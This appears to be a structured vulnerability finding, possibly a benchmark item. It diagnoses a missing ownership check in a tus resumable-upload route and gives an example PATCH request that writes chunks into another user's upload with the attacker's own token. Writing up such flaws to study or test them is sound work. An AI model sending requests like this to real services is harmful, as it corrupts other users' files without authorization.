diagnosis: The route handler verifies that the incoming request contains a valid bearer token but delegates the PATCH chunk upload to the tus server without checking whether the user associated with the token is the creator of the upload resource. An attacker with any valid user token can send corrupted chunk data to another user's in-progress upload.
exploit_request:
PATCH /resumable/chunks/upload_usr_bob_invoice_pdf HTTP/1.1
Host: files.enterprise.com
Authorization: Bearer <attacker_jwt>
Upload-Offset: 1024
Content-Type: application/offset+octet-stream
